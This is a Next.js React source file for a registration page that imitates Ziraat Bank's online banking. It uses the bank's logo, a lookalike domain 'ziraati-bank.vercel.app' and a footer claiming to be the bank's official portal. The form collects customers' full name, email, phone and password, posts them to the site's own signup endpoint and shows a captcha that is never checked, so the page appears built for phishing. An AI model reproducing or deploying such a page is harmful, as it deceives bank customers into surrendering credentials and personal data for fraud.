"use client";

import { useEffect, useState } from "react";
import { useFormik } from "formik";
import * as Yup from "yup";
import { useRouter, useSearchParams } from "next/navigation";
import {
  ChevronLeft,
  ChevronRight,
  CircleHelp,
  Eye,
  EyeOff,
  LockKeyhole,
  MessageCircle,
  MousePointerClick,
  ShieldCheck,
  Volume2,
} from "lucide-react";
import Image from "next/image";
import axios from 'axios';
import LoadingScreen from "../loading";
import { IoInformationCircleOutline } from "react-icons/io5";

/*
|--------------------------------------------------------------------------
| Validation
|--------------------------------------------------------------------------
*/

const loginSchema = Yup.object({
  fullname: Yup.string().required("Customer full name is required"),

  email: Yup.string()
    .email("Invalid email format!")
    .required("Please enter a valid email address!"),

  customerNumber: Yup.string()
    .required("Customer number is required")
    .min(4, "Customer number is too short"),

  password: Yup.string()
    .required("Password is required")
    .min(6, "Password must contain at least 6 characters"),

  securityCode: Yup.string()
    .required("Confirm you're a human. Enter security code to proceed.")
    .length(5, "Security code must contain 5 characters"),
});

/*
|--------------------------------------------------------------------------
| Header
|--------------------------------------------------------------------------
*/

function Header() {
  return (
    <>
      {/* Top red navigation */}

      <div className="h-[36px] bg-[#e90016]">
        <div
          className="
            mx-auto
            flex
            h-full
            max-w-[1200px]
            items-center
            justify-end
            gap-7
            px-5
            text-[12px]
            font-bold
            text-white

            max-[700px]:gap-3
            max-[700px]:text-[10px]
          "
        >
          <a href="a" className="hover:underline">
            SECURITY
          </a>

          <a href="a" className="hover:underline">
            HELP
          </a>

          <a href="a" className="hover:underline">
            FREQUENTLY ASKED QUESTIONS
          </a>

          <a href="#" className="hover:underline">
            ENGLISH
          </a>
        </div>
      </div>

      {/* Logo/header */}

      <header className="h-[75px] bg-white">
        <div
          className="
            mx-auto
            flex
            h-full
            max-w-[1200px]
            items-center
            justify-between
            px-5
          "
        >
          {/* bank logo */}

          <a href="/" className="flex items-center w-full justify-center lg:justify-start gap-3">
                       <Image
                        src={"/icons/logo-en.png"}
                        alt={"Ziraat Bank Logo"}
                        width={100}
                        height={100}
                        className="h-11 w-auto lg:block"
                      />
                    </a>

          {/* Contact information */}

          <div
            className="
              hidden
              items-center
              gap-3
              text-right
              md:flex
            "
          >
            <div className="text-[11px] font-bold text-[#4d565b]">
              <div className="text-[20px]">
                0850
              </div>

              <div>
                220 000
              </div>
            </div>

            <div className="text-[10px] font-semibold text-[#555d61]">
              Customer Contact
              <br />
              Center
              <br />
              www.ziraati-bank.vercel.app
            </div>
          </div>
        </div>
      </header>
    </>
  );
}

/*
|--------------------------------------------------------------------------
| Login Form
|--------------------------------------------------------------------------
*/

function generateCode() {
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const numbers = "0123456789";
  const all = letters + numbers;

  let code =
    letters[Math.floor(Math.random() * letters.length)] +
    numbers[Math.floor(Math.random() * numbers.length)];

  for (let i = 2; i < 5; i++) {
    code += all[Math.floor(Math.random() * all.length)];
  }

  return code
    .split("")
    .sort(() => Math.random() - 0.5)
    .join("");
}

function LoginForm() {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [mobileSignature, setMobileSignature] = useState(false);
  const [code, setCode] = useState("");
  const [isError, setIsError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  useEffect(() => {
    setCode(generateCode());
  }, []);

  const formik = useFormik({
    initialValues: {
      fullname: "",
      email: "",
      customerNumber: "",
      password: "",
      securityCode: "",
    },

    validationSchema: loginSchema,

    onSubmit: async (values, { setSubmitting }) => {
      setLoading(true);

      try {
        const res = await axios.post(
          `/api/auth/signup`,
          {
            fullname: values.fullname,
            email: values.email,
            phone: values.customerNumber,
            password: values.password,
          },
          {
            withCredentials: true,
            headers: { "Content-Type": "application/json" },
          },
        );

        if (res.status === 201) {
          setLoading(true);
          setTimeout(() => {
            setIsError(false);
            router.push(`/dashboard`);
          }, 10000);
        }
      } catch (err) {
        setErrorMessage(err.response.data.message);
        setIsError(true);
        setLoading(false);
      }

    },
  });

  return (
    <form onSubmit={formik.handleSubmit} className="w-full">
      {loading === true && <LoadingScreen />}
      {/* Welcome */}

      <h1
        className="
          mb-3
          text-[18px]
          text-white
          md:text-[19px]
        "
      >
        Welcome to our Online Banking service.
      </h1>

      {/* Tabs */}

      <div
        className="
          mb-3
          flex
          items-center
          justify-center
          gap-0
          text-[18px]
        "
      >
        <a
          href="/login"
          className="
            border-r
            border-white/50
            px-6
            py-1
            text-white/40
          "
        >
          LOGIN
        </a>

        <a
          href="/signup"
          className="
            px-6
            py-1
            text-white
          "
        >
          REGISTER
        </a>
      </div>

      {/* Customer number */}

      <div className="mb-2">
        <input
          name="fullname"
          type="text"
          autoComplete="on"
          placeholder="Full name"
          value={formik.values.fullname}
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          className="
            h-[49px]
            w-full
            rounded-full
            border-0
            bg-white
            px-4
            text-[14px]
            text-gray-800
            outline-none
            placeholder:text-gray-400
            focus:ring-2
            focus:ring-white/70
          "
        />

        {formik.touched.fullname && formik.errors.fullname ? (
          <p className="mt-1 px-4 text-xs font-semibold text-white">
            {formik.errors.fullname}
          </p>
        ) : null}
      </div>

      <div className="mb-2">
        <input
          name="email"
          type="text"
          autoComplete="on"
          placeholder="Email address"
          value={formik.values.email}
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          className="
            h-[49px]
            w-full
            rounded-full
            border-0
            bg-white
            px-4
            text-[14px]
            text-gray-800
            outline-none
            placeholder:text-gray-400
            focus:ring-2
            focus:ring-white/70
          "
        />

        {formik.touched.email && formik.errors.email ? (
          <p className="mt-1 px-4 text-xs font-semibold text-white">
            {formik.errors.email}
          </p>
        ) : null}
      </div>

      <div className="mb-2">
        <input
          name="customerNumber"
          type="text"
          autoComplete="off"
          placeholder="Phone"
          value={formik.values.customerNumber}
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          className="
            h-[49px]
            w-full
            rounded-full
            border-0
            bg-white
            px-4
            text-[14px]
            text-gray-800
            outline-none
            placeholder:text-gray-400
            focus:ring-2
            focus:ring-white/70
          "
        />

        {formik.touched.customerNumber && formik.errors.customerNumber ? (
          <p className="mt-1 px-4 text-xs font-semibold text-white">
            {formik.errors.customerNumber}
          </p>
        ) : null}
      </div>

      {/* Password */}

      <div className="relative mb-2">
        <input
          name="password"
          type={showPassword ? "text" : "password"}
          autoComplete="off"
          placeholder="Password"
          value={formik.values.password}
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          className="
            h-[49px]
            w-full
            rounded-full
            border-0
            bg-white
            px-4
            pr-12
            text-[14px]
            text-gray-800
            outline-none
            placeholder:text-gray-400
            focus:ring-2
            focus:ring-white/70
          "
        />

        <button
          type="button"
          onClick={() => setShowPassword(!showPassword)}
          className="
            absolute
            right-4
            top-1/2
            -translate-y-1/2
            text-gray-500
          "
          aria-label={showPassword ? "Hide password" : "Show password"}
        >
          {showPassword ? <EyeOff size={19} /> : <Eye size={19} />}
        </button>

        {formik.touched.password && formik.errors.password ? (
          <p className="mt-1 px-4 text-xs font-semibold text-white">
            {formik.errors.password}
          </p>
        ) : null}
      </div>

      {/* Security code */}

      <div
        className="
          mb-2
          grid
          grid-cols-[minmax(0,1fr)_minmax(0,1fr)]
          gap-2
        "
      >
        {/* CAPTCHA display */}

        <div
          className="
            flex
            h-[49px]
            items-center
            justify-between
            overflow-hidden
            rounded-full
            bg-white
            px-3
          "
        >
          <div
            className="
              select-none
              bg-gray-700
              px-2
              py-1
              text-[22px]
              font-bold
              tracking-[2px]
              text-white
              line-through
            "
          >
            {code}
          </div>

          <div className="flex items-center gap-1">
            <button
              type="button"
              className="text-[#e90016]"
              aria-label="Refresh code"
            >
              ↻
            </button>

            <button
              type="button"
              className="text-[#e90016]"
              aria-label="Listen to code"
            >
              <Volume2 size={18} />
            </button>
          </div>
        </div>

        <div>
          <input
            name="securityCode"
            type="text"
            autoComplete="off"
            maxLength={5}
            placeholder="Security Code"
            value={formik.values.securityCode}
            onChange={formik.handleChange}
            onBlur={formik.handleBlur}
            className="
              h-[49px]
              w-full
              rounded-full
              border-0
              bg-white
              px-4
              text-[14px]
              outline-none
              placeholder:text-gray-400
              focus:ring-2
              focus:ring-white/70
            "
          />
        </div>
      </div>

      {formik.touched.securityCode && formik.errors.securityCode ? (
        <p className="mb-2 px-4 text-xs font-semibold text-white">
          {formik.errors.securityCode}
        </p>
      ) : null}

      {/* Continue */}

      <button
        type="submit"
        disabled={formik.isSubmitting}
        className="
          h-[49px]
          w-full
          rounded-full
          bg-[#364247]
          text-[14px]
          font-bold
          text-white
          transition
          hover:bg-[#2b3539]
          disabled:cursor-not-allowed
          disabled:opacity-60
        "
      >
        {formik.isSubmitting ? "PROCESSING..." : "CONTINUE"}
      </button>

      {/* Digital banking banner */}

      <div
        className="
          mt-9
          flex
          min-h-[98px]
          items-center
          justify-between
          gap-4
          rounded-[18px]
          bg-[#364247]
          px-6
          py-4
        "
      >
        <div
          className="
            text-[16px]
            font-bold
            leading-[1.05]
            text-white
          "
        >
          To become our
          <br />
          Digital Banking customer
        </div>

        <a
          href="/signup"
          className="
            h-[50px]
            min-w-[150px]
            rounded-full
            bg-white
            px-5
            text-[14px]
            font-bold
            text-[#364247]
            flex justify-center items-center
            max-[450px]:min-w-[120px]
            max-[450px]:text-xs
          "
        >
          Apply Now
        </a>
      </div>

      {isError === true && (
        <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 justify-center bg-black/50 items-center loading-modal">
          <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
            <div className="flex justify-center items-center rounded-full p-2 dark:bg-isoDark bg-[#f4f4f5]">
              <IoInformationCircleOutline className="w-16 text-black dark:text-isoColor2 h-16" />
            </div>

            <h1 className="px-6 text-lg font-medium text-center md:font-semibold">
              Notice!
            </h1>

            <p className="text-xs text-center">
              {errorMessage}
            </p>

            <button
              type="button"
              onClick={() => setIsError(false)}
              className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </form>
  );
}

/*
|--------------------------------------------------------------------------
| Promotional Card
|--------------------------------------------------------------------------
*/

function PromotionCard() {
  return (
    <div
      className="
        rounded-[25px]
        bg-[#364247]
        px-6
        py-7
        text-white
        shadow-sm
      "
    >
      <div className="flex items-center justify-between gap-5">

        <div
          className="
            max-w-[260px]
            text-[19px]
            font-bold
            leading-[1.45]
          "
        >
          Ziraat Bank is always
          by your side with special
          interest rates for you!
        </div>

        <div
          className="
            hidden
            text-[65px]
            md:block
          "
        >
          ✉️
        </div>
      </div>

      {/* Slider dots */}

      <div className="mt-5 flex gap-1.5">
        <span className="h-2 w-2 rounded-full bg-white/40" />
        <span className="h-2 w-2 rounded-full bg-white/60" />
        <span className="h-2 w-2 rounded-full bg-white" />
      </div>

      {/* Controls */}

      <div className="mt-4 flex items-center gap-3">

        <button
          type="button"
          className="
            flex
            h-[36px]
            w-[36px]
            items-center
            justify-center
            rounded-xl
            border
            border-white/70
          "
        >
          <ChevronLeft size={20} />
        </button>

        <button
          type="button"
          className="
            flex
            h-[36px]
            w-[36px]
            items-center
            justify-center
            rounded-xl
            border
            border-white/70
          "
        >
          <ChevronRight size={20} />
        </button>

        <a
          href="/signup"
          className="
            ml-1
            h-[50px]
            rounded-full
            border
            border-white
            px-7
            text-[12px]
            font-bold
            text-center
            flex
            justify-center
            items-center
          "
        >
          GET A DEPOSIT OFFER
        </a>
      </div>
    </div>
  );
}

/*
|--------------------------------------------------------------------------
| Security Information
|--------------------------------------------------------------------------
*/

function SecurityInformation() {
  return (
    <div
      className="
        rounded-[25px]
        bg-white
        px-8
        py-7
        text-[#424a4e]
      "
    >

      {/* First */}

      <div
        className="
          flex
          items-start
          gap-5
          border-b
          border-gray-300
          pb-7
        "
      >
        <MousePointerClick
          size={34}
          strokeWidth={1.5}
          className="shrink-0"
        />

        <p
          className="
            m-0
            text-[14px]
            leading-[1.45]
          "
        >
          You can access Ziraat Bank Internet Banking
          only by clicking the official Internet
          Banking link on our website.
        </p>
      </div>

      {/* Second */}

      <div
        className="
          mt-7
          flex
          items-start
          gap-5
        "
      >
        <LockKeyhole
          size={34}
          strokeWidth={1.5}
          className="shrink-0"
        />

        <p
          className="
            m-0
            text-[14px]
            leading-[1.45]
          "
        >
          Never share your customer number,
          login password, ATM password, or
          other confidential information with
          anyone.
        </p>
      </div>
    </div>
  );
}

/*
|--------------------------------------------------------------------------
| Page
|--------------------------------------------------------------------------
*/

export default function Page() {
  return (
    <main className="min-h-screen bg-[#e90016]">
      
      <Header />

      {/* Main */}

      <section
        className="
          min-h-[570px]
          bg-[#e90016]
          px-5
          py-9

          lg:px-10
          lg:py-9
        "
      >
        <div
          className="
            mx-auto
            grid
            w-full
            max-w-[1050px]
            grid-cols-1
            gap-8

            lg:grid-cols-[400px_minmax(0,500px)]
            lg:gap-[70px]
          "
        >
          {/* LEFT */}

          <div>
            <LoginForm />
          </div>

          {/* RIGHT */}

          <div
            className="
              flex
              flex-col
              gap-6
            "
          >
            <PromotionCard />

            <SecurityInformation />
          </div>
        </div>
      </section>

      {/* Notice */}

      <div
        className="
          bg-[#364247]
          px-5
          py-3
          text-center
          text-xs
          text-white/80
        "
      >
        This is Ziraat Bank official website portal. For any enquiry, call 08502200000
      </div>
    </main>
  );
}